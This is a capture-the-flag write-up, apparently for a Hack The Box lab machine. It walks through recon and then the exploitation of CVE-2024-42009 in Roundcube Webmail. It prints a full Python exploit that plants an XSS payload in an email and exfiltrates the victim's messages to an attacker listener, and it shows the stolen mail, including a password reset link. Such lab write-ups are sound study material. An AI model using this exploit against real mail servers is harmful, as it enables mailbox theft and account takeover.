![](https://github.com/user-attachments/assets/8278069b-610a-4c6d-a7b6-101029e255af)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 08:34 +08
Nmap scan report for 10.10.11.54
Host is up (0.013s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80 -sCV 10.10.11.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 08:34 +08
Nmap scan report for 10.10.11.54
Host is up (0.0054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
```

## 2. Exploring Roundcube Webmail

### 2.1. Looking around

The web app is at `http://drip.htb/`:

```console
root@kali:~# curl 10.10.11.54
<meta http-equiv="refresh" content="0; url=http://drip.htb/" />
```

_Sign In_ links to `http://mail.drip.htb/`:

![](https://github.com/user-attachments/assets/4ee1c489-f446-4668-b63f-547648e37102)

Which is Roundcube Webmail:

![](https://github.com/user-attachments/assets/56f7f86b-5c0c-4bbb-a5fd-da7e6cb9c0ab)

_Sign Up_ links to account registration page:

![](https://github.com/user-attachments/assets/f36f0c12-8848-4a6e-b2bb-c50bee487843)

Register account and sign in, version is `1.6.7`:

![](https://github.com/user-attachments/assets/4825f5d1-8351-43b9-9d7d-641949bb3c52)

Note the `drip.darkcorp.htb` domain from _Headers_:

![](https://github.com/user-attachments/assets/367fb443-b91e-457f-87c8-7b694c22eac0)

### 2.2. CVE-2024-42009

[CVE-2024-42009](https://github.com/advisories/GHSA-j43g-prf4-578j): A Cross-Site Scripting vulnerability in Roundcube through 1.5.7 and 1.6.x through 1.6.7 allows a remote attacker to steal and send emails of a victim via a crafted e-mail message that abuses a Desanitization issue in message_body() in program/actions/mail/show.php.

Intercept the _Contact Us_ request via Burp Suite:

![](https://github.com/user-attachments/assets/4da2f0de-3c74-463e-9753-96da2e6c70c3)

![](https://github.com/user-attachments/assets/acfb7fba-0df8-4e14-91bb-583814e72f60)

Change `recipient=support%40drip.htb` into `recipient=test%40drip.htb` and forward the edited request to hijack the email

An email `bcase@drip.htb` is discovered that can be used for the XSS exploit:

![](https://github.com/user-attachments/assets/82b2372e-c795-4173-8b39-b7a8024f6d0c)

Found exploit code for CVE-2024-42009:
1. Adjust `http://10.10.14.3:8000` to kali IP address to reflect the information to correct location
2. Adjust `message = 2` to change the UID of the email to retrieve by `?_task=mail&_action=show&_uid=`

```python
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import threading
from lxml import html

# Configuration
TARGET_URL = 'http://drip.htb/contact'
LISTEN_PORT = 8000
LISTEN_IP = '0.0.0.0'

# Payload for the POST request
start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
message = 2
end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.14.3:8000/c=${btoa(t)}`)) foo=bar">Foo</body>'

post_data = {
    'name': 'test',
    'email': 'test@drip.htb',
    'message': f"{start_mesg}{message}{end_mesg}",
    'content': 'html',
    'recipient': 'bcase@drip.htb'
}
print(f"{start_mesg}{message}{end_mesg}")

# Headers for the POST request
headers = {
    'Host': 'drip.htb',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://drip.htb',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://drip.htb/index',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.aMTEkA.kLDBkDWeSgzVjLHOIUq6hZEF8CE',
    'Connection': 'close'
}

# Function to send the POST request
def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

# Custom HTTP request handler to capture and decode the incoming data
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
            print(f"[+] Received data {decoded_data}")
            tree = html.fromstring(decoded_data)

            # XPath query to find the div with id 'messagebody'
            message_body = tree.xpath('//div[@id="messagebody"]')
           
            # Check if the div exists and extract the content
            if message_body:
                # Extract inner text, preserving line breaks
                message_text = message_body[0].text_content().strip()
                print("[+] Extracted Message Body Content:\n")
                print(message_text)
            else:
                print("[!] No div with id 'messagebody' found.")

        else:
            print("[!] Received request but no data found.")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return  # Suppress default logging

# Function to start the HTTP server
def start_server():
    server_address = (LISTEN_IP, LISTEN_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
    httpd.serve_forever()

# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Send the POST request
send_post()

# Keep the main thread alive to continue listening
try:
    while True:
        pass
except KeyboardInterrupt:
    print("\n[+] Stopping server.")
```


Run the exploit:

```console
root@kali:~# python3 exploit.py
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch('/?_task=mail&_action=show&_uid=2&_mbox=INBOX&_extwin=1').then(r=>r.text()).then(t=>fetch(`http://10.10.14.3:8000/c=${btoa(t)}`)) foo=bar">Foo</body>
[+] Listening on port 8000 for exfiltrated data...
[+] POST Request Sent! Status Code: 200
[+] Received data <!DOCTYPE html>
```

Receive information:

```console
[+] Extracted Message Body Content:

Hey Bryce,

The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.

You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.

If you encounter any issues or have feedback, let me know so I can address them promptly.

Thanks
```

### 2.3. Getting access to `dev-a3f1-01.drip.htb`

![](https://github.com/user-attachments/assets/706d9d12-dd8e-4988-9b62-48e3b912e8bb)

![](https://github.com/user-attachments/assets/91727468-5214-43a8-ba57-d31ada02e822)

![](https://github.com/user-attachments/assets/4bc048cf-0899-46ac-97c9-f7675e4b510c)

Adjust `message = 3` to change the UID of the email to retrieve and get the password reset URL:

```console
[+] Extracted Message Body Content:

Your reset token has generated.  Please reset your password within the next 5 minutes.

You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMTMMg.l-r8fRl37TG9zNEF9l-ZG4W_XwA
```

![](https://github.com/user-attachments/assets/2a17c94a-5c16-4cd1-97b0-3d2be55369fb)

![](https://github.com/user-attachments/assets/55d9d9f5-86fb-49b9-8272-beb6f2255af8)
